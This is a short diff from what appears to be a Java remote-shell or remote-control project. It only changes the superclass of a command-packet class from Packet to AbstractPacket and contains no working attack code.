@@ -3,7 +3,7 @@ package com.redpois0n.packets;
 import com.redpois0n.Slave;
 import com.redpois0n.ui.frames.FrameRemoteShell;
 
-public class PacketCMD extends Packet {
+public class PacketCMD extends AbstractPacket {
 
 	@Override
 	public void read(Slave slave, String line) throws Exception {
